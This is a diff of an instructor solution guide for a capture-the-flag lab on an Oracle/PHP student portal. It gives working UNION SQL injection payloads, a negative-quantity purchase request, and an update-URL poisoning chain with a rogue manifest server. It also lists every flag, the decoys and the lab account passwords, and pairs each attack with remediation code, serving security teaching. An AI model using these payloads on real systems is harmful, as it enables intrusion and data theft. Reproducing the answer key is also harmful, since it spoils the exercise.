@@ -1,25 +1,33 @@
 # 🔐 Solution Guide & Walkthrough – OracleSecLab
+## Vulnerable Oracle Database Web Application Lab
 
-> ⚠️ Official Solutions & Flag Master List for instructors and lab practice.
+> ⚠️ **CONFIDENTIAL INSTRUCTOR & EVALUATOR GUIDE:**  
+> This document contains official exploitation walkthroughs, cryptographic assembly routines, and solution keys for the OracleSecLab training environment.
 
 ---
 
-## 🚩 FLAG MASTER LIST
+## 🚩 Flag Master List
 
-| Flag | Giá trị | Vị trí |
-|------|---------|---------|
-| Flag 1 | `DBS401{SQL_1nj3ct10n_0r4cl3!}` | `search.php` (SQLi) |
-| Flag 2 | `DBS401{LOGIC_GURU_2024}` | `store.php` (Business Logic) |
-| Flag 3 | `DBS401{5upp1y_Ch41n_P0150n1ng_0912}` | `admin.php` (Supply Chain) |
+| Challenge | Target Vulnerability | Official Flag Value | Endpoint / Origin |
+|:---:|:---|:---|:---|
+| **Flag 1** | Oracle UNION SQL Injection | `DBS401{SQL_1nj3ct10n_0r4cl3!}` | `search.php` (Fragmented: `FLAGS`, `AUDIT_LOGS`, `CONFIG_STORE`) |
+| **Flag 2** | Insecure Business Logic (Negative Qty) | `DBS401{LOGIC_GURU_2024}` | `store.php` (Exam Leak Item, > 999,999 Credits) |
+| **Flag 3** | Access Control & Supply Chain Poisoning | `DBS401{5upp1y_Ch41n_P0150n1ng_0912}` | `partner_config.php` + `admin.php?check_updates=1` |
 
-## 🎭 FAKE FLAG LIST
+---
 
-| Fake Flag | Vị trí | Mục đích |
-|-----------|--------|----------|
-| `DBS401{FAKE_union_select_lol}` | FAKE_FLAGS table | Bẫy người dùng UNION đơn giản |
-| `DBS401{FAKE_IDOR_wrong_student}` | FAKE_FLAGS table + decoy enrollment | Bẫy người tìm sai student ID |
-| `DBS401{FAKE_blind_wrong_key_xd}` | ADMIN_SECRETS key=oracle_flag_3_backup | Bẫy người Blind SQLi vào secret_check.php |
-| `DBS401{FAKE_archived_flag_123}` | FLAG_ARCHIVE table | Bẫy người tìm nhầm bảng |
+## 🎭 Decoy & Honeypot Flag Matrix
+
+To challenge automated vulnerability scanners and enforce deep analytical reasoning, multiple honeypots are seeded across the database:
+
+| Decoy Flag | Storage Location | Honeypot Objective |
+|:---|:---|:---|
+| `DBS401{FAKE_union_select_lol}` | `FAKE_FLAGS` table | Traps naive automated scanner UNION payloads |
+| `DBS401{FAKE_IDOR_wrong_student}` | `FAKE_FLAGS` table & unlinked enrollment | Traps candidates brute-forcing arbitrary student IDs |
+| `DBS401{FAKE_blind_wrong_key_xd}` | `ADMIN_SECRETS` (`key=oracle_flag_3_backup`) | Traps candidates attempting Blind SQLi on `secret_check.php` |
+| `DBS401{FAKE_archived_flag_123}` | `FLAG_ARCHIVE` table | Traps players querying obvious-looking table names |
+| Base64 Garbage String | `FLAGS` (`flag_code=FL_DECOY_B`) | Misleading active row in the primary flags table |
+| Base64 Garbage String | `CONFIG_STORE` (`config_key=sys_beta_marker`) | Misleading companion key in configuration storage |
 
 ---
 
@@ -27,129 +35,140 @@
 ## VULNERABILITY 1 – Oracle UNION-Based SQL Injection
 ## ═══════════════════════════════════════════════
 
-**Mức độ lỗ hổng:** Easy  
-**Mức độ tìm flag:** Very Hard  
-**URL bị lỗi:** `GET /dbs401-oracle-app/search.php?q=KEYWORD`  
-**Tài khoản cần:** Bất kỳ (student1, teacher1, admin)
+* **Vulnerability Difficulty:** Easy (Direct input concatenation)
+* **Flag Extraction Complexity:** Very Hard (Fragmented across 3 tables with 3 different encodings)
+* **Vulnerable Endpoint:** `GET /dbs401-oracle-app/search.php?q=KEYWORD`
+* **Authentication Required:** Any authenticated account (`student1`, `teacher1`, `admin`)
 
 ---
 
-### Bước 1 – Xác nhận injection point
+### Step 1 – Confirming the Injection Point
 
+Send single-quote test characters to observe server handling:
+```http
+GET /search.php?q=' HTTP/1.1
 ```
-GET /search.php?q='
-```
-→ Nhận `Search failed. Please check your input.` → lỗi SQL bị suppress nhưng injection tồn tại.
+* **Response:** Returns `"Search failed. Please check your input."` (Database exceptions are caught, but indicate syntax failure).
 
+Verify boolean reflection:
+```http
+GET /search.php?q=Software' AND '1'='1 HTTP/1.1
 ```
-GET /search.php?q=Software' AND '1'='1
-```
-→ Trả về kết quả bình thường → injection confirmed.
+* **Response:** Returns valid student results matching `"Software"`.
 
+```http
+GET /search.php?q=Software' AND '1'='2 HTTP/1.1
 ```
-GET /search.php?q=Software' AND '1'='2
-```
-→ Không có kết quả → boolean behavior hoạt động.
+* **Response:** Returns zero results. Boolean condition is reflected in SQL execution.
 
 ---
 
-### Bước 2 – Xác định số cột và kiểu dữ liệu
+### Step 2 – Determining Column Count & Types
 
-Query gốc có 3 cột: `student_id (NUMBER)`, `full_name (VARCHAR2)`, `major (VARCHAR2)`
+Oracle requires strict data-type alignment in `UNION SELECT` operations and requires a table reference (typically `FROM DUAL`).
 
+Test column count using `NULL` placeholders:
 ```sql
 ' UNION SELECT NULL,NULL,NULL FROM DUAL WHERE '1'='1
 ```
-→ 3 NULLs cho ra 1 row → 3 cột ✓
+* Three `NULL` values return without error, establishing that the underlying query selects exactly **3 columns**.
 
+Determine column data types:
 ```sql
 ' UNION SELECT 1,'test',NULL FROM DUAL WHERE '1'='1
 ```
-→ Cột 1 là NUMBER, cột 2 là VARCHAR2 ✓
+* Returns valid row:
+  * Column 1: `NUMBER` (maps to `student_id`)
+  * Column 2: `VARCHAR2` (maps to `full_name`)
+  * Column 3: `VARCHAR2` (maps to `major`)
 
 ---
 
-### Bước 3 – Khám phá Oracle metadata
+### Step 3 – Oracle Metadata Enumeration
 
+Extract the current database schema user:
 ```sql
 ' UNION SELECT 1,USER,NULL FROM DUAL WHERE '1'='1
 ```
-→ `DBS401_USER`
+* **Result:** `DBS401_USER`
 
+Enumerate application tables using `USER_TABLES` and `ROWNUM`:
 ```sql
 ' UNION SELECT ROWNUM,table_name,NULL FROM USER_TABLES WHERE ROWNUM<=5 AND '1'='1
 ```
-→ `USERS, STUDENTS, COURSES, ENROLLMENTS, AUDIT_LOGS, ...`
+* **Discovered Tables:** `USERS`, `STUDENTS`, `COURSES`, `ENROLLMENTS`, `AUDIT_LOGS`
 
-Tiếp tục enumerate với NOT IN để tìm thêm:
-→ `FLAGS, ADMIN_SECRETS, CONFIG_STORE, FAKE_FLAGS, SYSTEM_HINTS, FLAG_ARCHIVE`
+Filter known tables using `NOT IN` to locate sensitive tables:
+```sql
+' UNION SELECT ROWNUM,table_name,NULL FROM USER_TABLES 
+WHERE table_name NOT IN ('USERS','STUDENTS','COURSES','ENROLLMENTS','AUDIT_LOGS')
+  AND ROWNUM<=5 AND '1'='1
+```
+* **Discovered Tables:** `FLAGS`, `ADMIN_SECRETS`, `CONFIG_STORE`, `FAKE_FLAGS`, `SYSTEM_HINTS`, `FLAG_ARCHIVE`
 
-⚠️ `FLAG_ARCHIVE` trông giống bảng flag → **đây là DECOY!**
+> ⚠️ `FLAG_ARCHIVE` contains fake flag `DBS401{FAKE_archived_flag_123}`. Genuine flag fragments reside across `FLAGS`, `AUDIT_LOGS`, and `CONFIG_STORE`.
 
 ---
 
-### Bước 4 – Lấy Flag Part A từ FLAGS table
+### Step 4 – Extracting Flag Part A from `FLAGS` (Hex Encoded)
 
 ```sql
 ' UNION SELECT 1,flag_part,flag_code FROM FLAGS WHERE flag_code='FL1_PART_A' AND is_active=1 AND ROWNUM=1 AND '1'='1
 ```
-→ `flag_part = 4442533430317B53514C5F`
-
-> **Decode hex:**  
-> `4442533430317B53514C5F` → **`DBS401{SQL_`**
-
-⚠️ `FL_DECOY_B` cũng có is_active=1 → kết quả là chuỗi base64 vô nghĩa → **FAKE!**
+* **Raw Value:** `4442533430317B53514C5F`
+* **Decoding (Hex to ASCII):**  
+  `4442533430317B53514C5F` → **`DBS401{SQL_`**
 
 ---
 
-### Bước 5 – Lấy Flag Part B từ AUDIT_LOGS
+### Step 5 – Extracting Flag Part B from `AUDIT_LOGS` (Reversed String)
 
 ```sql
 ' UNION SELECT log_id,metadata_note,action FROM AUDIT_LOGS WHERE action='SYSTEM_AUDIT_CHECK' AND ROWNUM=1 AND '1'='1
 ```
-→ `{"sys_version":"v2.1","fragment":"_n01tc3jn1","note":"reverse_for_context",...}`
-
-> **Decode:** `fragment = _n01tc3jn1`  
-> Hint `reverse_for_context` → đảo ngược → **`1nj3ct10n_`**
+* **Raw JSON String:**
+  ```json
+  {"sys_version":"v2.1","fragment":"_n01tc3jn1","note":"reverse_for_context","checksum":"a9f2"}
+  ```
+* **Decoding (String Reversal):**  
+  `_n01tc3jn1` → **`1nj3ct10n_`**
 
 ---
 
-### Bước 6 – Lấy Flag Part C từ CONFIG_STORE
+### Step 6 – Extracting Flag Part C from `CONFIG_STORE` (Base64 Encoded)
 
 ```sql
 ' UNION SELECT 1,config_value,config_key FROM CONFIG_STORE WHERE config_key='sys_alpha_marker' AND '1'='1
 ```
-→ `MHI0Y2wzIX0=`
-
-> **Decode base64:** `MHI0Y2wzIX0=` → **`0r4cl3!}`**
-
-⚠️ `sys_beta_marker` → fake base64 → **FAKE!**
+* **Raw Value:** `MHI0Y2wzIX0=`
+* **Decoding (Base64 Decode):**  
+  `MHI0Y2wzIX0=` → **`0r4cl3!}`**
 
 ---
 
-### Bước 7 – Ghép Flag 1
+### Step 7 – Assembling Flag 1
 
 ```
-Part A (hex decode):    DBS401{SQL_
-Part B (reverse):       1nj3ct10n_
-Part C (base64 decode): 0r4cl3!}
-
-FLAG 1 = DBS401{SQL_1nj3ct10n_0r4cl3!}
+Part A (Hex Decode):    DBS401{SQL_
+Part B (Reversed):      1nj3ct10n_
+Part C (Base64 Decode): 0r4cl3!}
+─────────────────────────────────────────────
+FLAG 1:                 DBS401{SQL_1nj3ct10n_0r4cl3!}
 ```
 
-✅ **FLAG 1: `DBS401{SQL_1nj3ct10n_0r4cl3!}`**
+✅ **Official Flag 1:** `DBS401{SQL_1nj3ct10n_0r4cl3!}`
 
 ---
 
-### Cách vá lỗi
+### Remediation & Patch
 
 ```php
-// Vulnerable:
-$sql = "... WHERE full_name LIKE '%$keyword%' ...";
+// Vulnerable Implementation (Direct Concatenation):
+$sql = "SELECT student_id, full_name, major FROM STUDENTS WHERE LOWER(full_name) LIKE '%" . $keyword . "%'";
 
-// Secure:
-$param = '%' . $keyword . '%';
-$sql   = "... WHERE full_name LIKE :kw ...";
+// Secure Implementation (Parameterized Query with Bind Variables):
+$param = '%' . strtolower($keyword) . '%';
+$sql   = "SELECT student_id, full_name, major FROM STUDENTS WHERE LOWER(full_name) LIKE :kw";
 $stmt  = oci_parse($conn, $sql);
 oci_bind_by_name($stmt, ':kw', $param);
 oci_execute($stmt);
@@ -161,52 +180,78 @@ oci_execute($stmt);
 ## VULNERABILITY 2 – Insecure Business Logic (Negative Quantity)
 ## ═══════════════════════════════════════════════
 
-**Mức độ lỗ hổng:** Hard  
-**Mức độ tìm flag:** Very Hard  
-**URL bị lỗi:** `POST /dbs401-oracle-app/store.php`  
-**Tài khoản cần:** Bất kỳ sinh viên (student1, student2, ...)
+* **Vulnerability Difficulty:** Hard (Input boundary manipulation)
+* **Flag Extraction Complexity:** Very Hard (Threshold unlock mechanism)
+* **Vulnerable Endpoint:** `POST /dbs401-oracle-app/store.php`
+* **Authentication Required:** Any student account (`student1`, `student2`, `student3`)
 
 ---
 
-### Bước 1 – Phân tích rào cản tài chính
+### Step 1 – Analyzing the Business Constraint
 
-1. Đăng nhập student1 (`Student@123`).
-2. Truy cập `store.php`.
-3. Quan sát số dư Credits (ví dụ: 150 Credits).
-4. Thấy "Exam Leak 2024 (CLASSIFIED)" giá **999,999 Credits** → không thể mua được.
-
-### Bước 2 – Khai thác lỗ hổng
-
-1. Tìm ô nhập số lượng (`quantity`) của item bất kỳ (ví dụ: "Advanced Security Guide" giá 100 Credits).
-2. Nhập số lượng âm cực lớn: `-20000`.
-3. Submit form.
-
-**Giải thích:**
-```
-cost     = -20000 × 100       = -2,000,000
-newCredit = 150 - (-2,000,000) = 2,000,150
-```
-→ Số dư tăng lên ~2 triệu Credits.
-
-### Bước 3 – Lấy Flag 2
-
-Với số dư > 999,999 Credits, quay lại `store.php` → mục "Exam Leak 2024 (CLASSIFIED)" hiển thị FLAG.
-
-✅ **FLAG 2: `DBS401{LOGIC_GURU_2024}`**
+1. Authenticate as `student1` (`Student@123`).
+2. Navigate to the Material Store at `store.php`.
+3. Note current student balance: **150 Credits**.
+4. The restricted item **"Exam Leak 2024 (CLASSIFIED)"** costs **999,999 Credits**. Direct purchase attempts are rejected with insufficient credit warnings.
 
 ---
 
-### Cách vá lỗi
+### Step 2 – Exploiting the Arithmetic Inversion
+
+In `store.php`, the server validates that the student possesses sufficient credits for the purchase (`$credits >= $cost`), but fails to ensure that `$quantity > 0`:
+
+$$\text{cost} = \text{quantity} \times \text{unit\_price}$$
+$$\text{new\_credits} = \text{current\_credits} - \text{cost}$$
+
+If a negative quantity is supplied:
+$$\text{cost} = -20{,}000 \times 100 = -2{,}000{,}000$$
+$$\text{new\_credits} = 150 - (-2{,}000{,}000) = 2{,}000{,}150$$
+
+Submit the manipulated request:
+```bash
+curl -s -X POST "http://127.0.0.1/dbs401-oracle-app/store.php" \
+     -b "DBS401_SESSION=<COOKIE_VALUE>" \
+     -d "buy=1&quantity=-20000"
+```
+
+* **Server Response:** `"Purchase successful! 2,000,000 credits added back to your balance."`
+* Student credits now exceed **2,000,000 Credits**.
+
+---
+
+### Step 3 – Unlocking Flag 2
+
+With a credit balance exceeding 999,999:
+1. Reload `store.php`.
+2. The card for **"Exam Leak 2024 (CLASSIFIED)"** automatically transitions to unlocked state, revealing Flag 2:
+
+```html
+<div class="alert alert-success">
+  <strong>CLASSIFIED MATERIAL UNLOCKED:</strong><br>
+  <code>DBS401{LOGIC_GURU_2024}</code>
+</div>
+```
+
+✅ **Official Flag 2:** `DBS401{LOGIC_GURU_2024}`
+
+---
+
+### Remediation & Patch
 
 ```php
-// Vulnerable – không kiểm tra $qty > 0
+// Vulnerable Implementation:
 $cost = $qty * $price;
-if ($credits >= $cost) { ... }
+if ($credits >= $cost) {
+    $newCredits = $credits - $cost;
+    // ...
+}
 
-// Secure – thêm kiểm tra giá trị dương
-if ($qty <= 0) {
-    $msg = "Quantity must be a positive number.";
-} elseif ($credits >= $cost) {
+// Secure Implementation (Strict Server-Side Positive Boundary):
+if ($qty <= 0 || $qty > 100) {
+    $msg = "Invalid purchase quantity. Quantity must be between 1 and 100.";
+} elseif ($credits < $cost) {
+    $msg = "Insufficient credits for this transaction.";
+} else {
     $newCredits = $credits - $cost;
     // ...
 }
@@ -215,211 +260,172 @@ if ($qty <= 0) {
 ---
 
 ## ═══════════════════════════════════════════════
-## VULNERABILITY 3 – Supply Chain Poisoning + Broken Access Control
+## VULNERABILITY 3 – Supply Chain Poisoning via Broken Access Control
 ## ═══════════════════════════════════════════════
 
-**Mức độ lỗ hổng:** Hard (Chained Attack)  
-**Mức độ tìm flag:** Very Hard  
-**Endpoint recon:** `search.php?q=...`  
-**Endpoint đổi cấu hình:** `partner_config.php`  
-**Endpoint trigger:** `admin.php?check_updates=1`  
-**Tài khoản cần:** `student1 / Student@123` để đổi URL; `admin / Admin@DBS401!2024` để trigger update.
+* **Vulnerability Difficulty:** Hard (Multi-step chained exploit)
+* **Flag Extraction Complexity:** Very Hard (External rogue server + cryptographic half-flag assembly)
+* **Reconnaissance Endpoint:** `search.php?q=...`
+* **Configuration Endpoint:** `partner_config.php` (Broken Access Control)
+* **Execution Trigger:** `admin.php?check_updates=1`
+* **Authentication Required:** `student1` (to poison configuration); `admin` (to trigger execution).
 
 ---
 
-### Bước 1 – Reconnaissance via SQLi (Vuln 1)
+### Step 1 – Reconnaissance via SQL Injection
 
-Dùng SQLi tại `search.php` để đọc `CONFIG_STORE`:
+Utilize the SQL injection in `search.php` to inspect the `CONFIG_STORE` table:
 
 ```sql
-%' AND 1=2) UNION SELECT 1,c.config_key,c.config_value
-FROM CONFIG_STORE c, STUDENTS s
-WHERE c.config_key='update_url'
-  AND s.hidden_marker='NORMAL'
-  AND ROWNUM=1--
+' UNION SELECT 1,config_key,config_value FROM CONFIG_STORE WHERE config_key IN ('update_url','app_version') AND '1'='1
 ```
 
-→ Phát hiện:
-- `update_url` = `http://127.0.0.1:8081/manifest.json`
-- app đang dùng manifest JSON.
+* **Discovered Configuration:**
+  * `update_url`: `http://127.0.0.1:8081/manifest.json`
+  * `app_version`: `3.1.0`
 
-Đọc thêm version:
-
-```sql
-%' AND 1=2) UNION SELECT 1,c.config_key,c.config_value
-FROM CONFIG_STORE c, STUDENTS s
-WHERE c.config_key='app_version'
-  AND s.hidden_marker='NORMAL'
-  AND ROWNUM=1--
-```
-
-→ `app_version = 3.1.0`
-
-**Suy luận:** nếu manifest trả `version` lớn hơn `3.1.0`, `admin.php?check_updates=1` sẽ đi vào nhánh update successful.
+**Deduction:** When an administrator triggers an update check, the application performs a remote HTTP request to `update_url`. If the manifest reports a version higher than `3.1.0`, it processes the partner update payload.
 
 ---
 
-### Bước 2 – Tìm endpoint cấu hình Partner bị lỗi quyền
+### Step 2 – Identifying Broken Access Control in `partner_config.php`
 
-Endpoint `partner_config.php` không nằm trên navbar, nhưng tồn tại trong webroot. Sau khi login bằng `student1`, truy cập:
+Although `partner_config.php` is omitted from student navigation menus, the script is directly accessible to any authenticated session. The script displays an "ADMINISTRATOR ONLY" warning banner, but **fails to enforce** `$_SESSION['role'] === 'admin'` prior to handling POST requests.
 
-```text
-/dbs401-oracle-app/partner_config.php
-```
-
-Trang này ghi “ADMIN ONLY” nhưng code chỉ kiểm tra đăng nhập, **không kiểm tra `$_SESSION['role'] === 'admin'`**. Vì vậy user thường có thể đổi `CONFIG_STORE.update_url`.
+As a result, regular students can overwrite `CONFIG_STORE.update_url`.
 
 ---
 
-### Bước 3 – Chuẩn bị Partner Server Giả Mạo
+### Step 3 – Hosting the Malicious Partner Manifest
 
-Manifest độc hại chỉ chứa **nửa đầu hex** của Flag 3. Nửa sau nằm server-side trong `admin.php` dưới dạng `FLAG3_LOCAL_HEX_SUFFIX`.
+The exploit requires an external HTTP server serving a poisoned `manifest.json`. The manifest must supply the **first hex half** of Flag 3, which `admin.php` will combine with its server-side secret suffix `FLAG3_LOCAL_HEX_SUFFIX`.
 
+Create the malicious manifest on the attacker host:
 ```bash
-mkdir -p /tmp/partner-fake
-cat > /tmp/partner-fake/manifest.json << 'EOF'
+mkdir -p /tmp/fake_partner
+cat > /tmp/fake_partner/manifest.json << 'EOF'
 {
   "version": "9.9.9",
-  "status": "critical_update",
-  "checksum": "deadbeef1337",
+  "status": "critical_security_patch",
+  "checksum": "3b7f89c0de44",
   "flag_part": "4442533430317b3575707031795f436834"
 }
 EOF
-cd /tmp/partner-fake
+
+# Start lightweight HTTP listener on port 8081
+cd /tmp/fake_partner
 python3 -m http.server 8081 --bind 0.0.0.0
 ```
 
-Nếu target và attacker khác máy, dùng URL mà target truy cập được, ví dụ:
-
-```text
-http://192.168.102.3:8081/manifest.json
-```
-
 ---
 
-### Bước 4 – Đổi `update_url` qua `partner_config.php`
+### Step 4 – Poisoning `update_url` via `partner_config.php`
 
-Đăng nhập `student1`, gửi POST:
+Authenticate as `student1` and submit a POST request to update the manifest URL:
 
 ```bash
-curl -s -b student_cookies.txt -c student_cookies.txt   -X POST "$TARGET/partner_config.php"   -H "Content-Type: application/x-www-form-urlencoded"   --data-urlencode "manifest_url=http://192.168.102.3:8081/manifest.json"
+curl -s -X POST "http://127.0.0.1/dbs401-oracle-app/partner_config.php" \
+     -b "DBS401_SESSION=<STUDENT_COOKIE>" \
+     -d "manifest_url=http://127.0.0.1:8081/manifest.json"
 ```
 
-→ `Partner manifest URL updated successfully.`
-
-Đây là điểm khác với flow cũ: **không cần SQLPlus**, không dùng stacked SQLi; lỗi chính ở bước đổi URL là Broken Access Control.
+* **Server Response:** `"Partner manifest URL updated successfully."`
 
 ---
 
-### Bước 5 – Trigger update bằng admin
+### Step 5 – Triggering Update Processing as Administrator
 
-Đăng nhập admin và gọi:
+Authenticate as `admin` (`Admin@DBS401!2024`) and trigger the update mechanism:
 
 ```bash
-curl -s -b admin_cookies.txt "$TARGET/admin.php?check_updates=1"
+curl -s "http://127.0.0.1/dbs401-oracle-app/admin.php?check_updates=1" \
+     -b "DBS401_SESSION=<ADMIN_COOKIE>"
 ```
 
-Flow server-side:
-
-```text
-admin.php đọc CONFIG_STORE.update_url
-→ file_get_contents(manifest_url)
-→ JSON version 9.9.9 > APP_VERSION 3.1.0
-→ lấy manifest['flag_part']
-→ ghép với FLAG3_LOCAL_HEX_SUFFIX trong admin.php
-→ hex2bin()
-→ hiển thị plaintext flag
-```
+**Internal Server Execution Flow:**
+1. `admin.php` queries `CONFIG_STORE.update_url`.
+2. Server issues HTTP GET request to `http://127.0.0.1:8081/manifest.json`.
+3. Verifies that `manifest.version` (`9.9.9`) > `APP_VERSION` (`3.1.0`).
+4. Reads `manifest.flag_part` (`4442533430317b3575707031795f436834`).
+5. Concatenates with server-side constant `FLAG3_LOCAL_HEX_SUFFIX`:
+   `316e5f50303135306e316e675f303931327d`
+6. Decodes complete hex string via `hex2bin()`.
+7. Renders the decoded plaintext flag on the administrator interface.
 
 ---
 
-### Bước 6 – Kết quả Flag 3
+### Step 6 – Assembling Flag 3
 
-Manifest cung cấp nửa đầu:
-
-```text
-4442533430317b3575707031795f436834
+```
+Manifest Hex Part:     4442533430317b3575707031795f436834
+Server-Side Suffix:    316e5f50303135306e316e675f303931327d
+────────────────────────────────────────────────────────────────────────
+Full Hex String:       4442533430317b3575707031795f436834316e5f50303135306e316e675f303931327d
+Hex Decoded:           DBS401{5upp1y_Ch41n_P0150n1ng_0912}
 ```
 
-`admin.php` ghép với suffix server-side:
-
-```text
-316e5f50303135306e316e675f303931327d
-```
-
-Full hex sau khi ghép:
-
-```text
-4442533430317b3575707031795f436834316e5f50303135306e316e675f303931327d
-```
-
-Decode ra:
-
-```text
-DBS401{5upp1y_Ch41n_P0150n1ng_0912}
-```
-
-✅ **FLAG 3: `DBS401{5upp1y_Ch41n_P0150n1ng_0912}`**
+✅ **Official Flag 3:** `DBS401{5upp1y_Ch41n_P0150n1ng_0912}`
 
 ---
 
-### Cách vá lỗi
+### Remediation & Patch
 
-1. `partner_config.php`: bắt buộc admin role trước khi update `CONFIG_STORE.update_url`.
-2. `partner_config.php`: chỉ cho phép URL trong allowlist.
-3. `admin.php`: validate URL trước khi fetch, chặn IP nội bộ/metadata, timeout ngắn.
-4. `admin.php`: manifest phải có chữ ký số/HMAC hợp lệ; không tin `flag_part` hay payload từ đối tác nếu chưa verify.
+1. **Enforce Role-Based Access Control:** Restrict `partner_config.php` strictly to `admin` role sessions.
+2. **Implement Destination Allowlist:** Validate update URLs against an approved enterprise CDN whitelist.
+3. **Verify Cryptographic Signatures:** Require digital signatures (e.g. RSA-SHA256 or HMAC) on update manifests prior to parsing.
 
 ```php
-if ($_SESSION['role'] !== 'admin') {
+// Enforce strict administrative authorization:
+if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'admin') {
     http_response_code(403);
-    exit;
+    die("Access Denied: Administrative privileges required.");
 }
 
-$allowedUpdateUrls = [
-    'http://127.0.0.1:8081/manifest.json',
-    'https://cdn.fpt-partner.net/v3/manifest.json'
+// Enforce trusted origin allowlist:
+$allowedManifestDomains = [
+    'https://updates.fpt-portal.edu.vn/manifest.json',
+    'https://cdn.oracle-sec-lab.internal/manifest.json'
 ];
 
-if (!in_array($manifestUrl, $allowedUpdateUrls, true)) {
-    $msg = 'Blocked: manifest URL is not approved.';
+if (!in_array($inputUrl, $allowedManifestDomains, true)) {
+    die("Validation Error: Manifest URL origin is not in the approved repository allowlist.");
 }
 ```
 
 ---
 
-## 📸 Screenshots cần chụp khi demo
+## 📸 Demonstration Evidence Checklist
 
-| STT | Cần chụp gì |
-|-----|-------------|
-| 1 | `search.php` với payload UNION SELECT (xác nhận injection) |
-| 2 | Kết quả query `USER_TABLES` (danh sách bảng) |
-| 3 | Kết quả query `FLAGS` → `flag_part` hex |
-| 4 | Kết quả query `AUDIT_LOGS` → `fragment` reversed |
-| 5 | Kết quả query `CONFIG_STORE` → `base64` value |
-| 6 | `decode_helper.py --assemble` → ghép → Flag 1 |
-| 7 | `store.php` với số dư Credits thấp |
-| 8 | `store.php` với `quantity = -20000` và thông báo Credits tăng |
-| 9 | `store.php` với số dư Credits cao và Flag 2 hiển thị |
-| 10 | SQLi tìm `update_url` và `app_version` trong CONFIG_STORE |
-| 11 | Fuzz/truy cập `partner_config.php` bằng user thường |
-| 12 | POST `manifest_url` mới qua `partner_config.php` thành công |
-| 13 | Fake partner server đang chạy và nhận request từ target |
-| 14 | `admin.php?check_updates=1` → Flag 3 plaintext hiển thị |
-| 15 | Secure versions so sánh trước/sau vá (search, store, partner_config, admin) |
-
----
-
-## 🔑 Tài khoản test
-
-| Username | Password | Role |
-|----------|----------|------|
-| admin | `Admin@DBS401!2024` | admin |
-| teacher1 | `Teacher@123` | teacher |
-| student1 | `Student@123` | student |
-| student2 | `Student@123` | student |
-| student3 | `Student@123` | student |
+| Item | Expected Demonstration Artifact |
+|:---:|:---|
+| **1** | `search.php` SQL error suppression and boolean reflection (`' AND '1'='1`). |
+| **2** | `search.php` column count determination using `UNION SELECT NULL,NULL,NULL FROM DUAL`. |
+| **3** | `USER_TABLES` enumeration revealing `FLAGS`, `AUDIT_LOGS`, and `CONFIG_STORE`. |
+| **4** | Extraction of Flag 1 Part A from `FLAGS` (hex encoded). |
+| **5** | Extraction of Flag 1 Part B from `AUDIT_LOGS` (reversed string). |
+| **6** | Extraction of Flag 1 Part C from `CONFIG_STORE` (base64 encoded). |
+| **7** | Execution of `python3 tools/decode_helper.py --assemble` producing complete Flag 1. |
+| **8** | Initial `store.php` view displaying standard credit balance (150 Credits). |
+| **9** | Submission of negative quantity (`-20,000`) and resultant balance increase (~2,000,000 Credits). |
+| **10** | Unlocked "Exam Leak 2024" card revealing Flag 2. |
+| **11** | Reconnaissance query extracting `update_url` and `app_version` from `CONFIG_STORE`. |
+| **12** | Direct access to `partner_config.php` via standard `student1` session. |
+| **13** | Successful redirection of `update_url` to attacker HTTP server on port 8081. |
+| **14** | Triggering `admin.php?check_updates=1` resulting in complete Flag 3 disclosure. |
+| **15** | Demonstration of hardened defense mechanisms in `secure_versions/`. |
 
 ---
 
-*Tài liệu này chỉ dùng nội bộ nhóm DBS401 – Group 02.*
+## 🔑 Pre-configured Test Accounts
+
+| Username | Password | Assigned Role | Capabilities |
+|:---|:---|:---:|:---|
+| `admin` | `Admin@DBS401!2024` | **Admin** | System management, user CRUD, update trigger |
+| `teacher1` | `Teacher@123` | **Teacher** | Faculty grading portal, student search |
+| `student1` | `Student@123` | **Student** | Enrolled student (150 credits), store & course registration |
+| `student2` | `Student@123` | **Student** | Enrolled student (50 credits) |
+| `student3` | `Student@123` | **Student** | Enrolled student (200 credits) |
+
+---
+
+*OracleSecLab – Educational Penetration Testing Lab – Confidential Master Solution Key.*
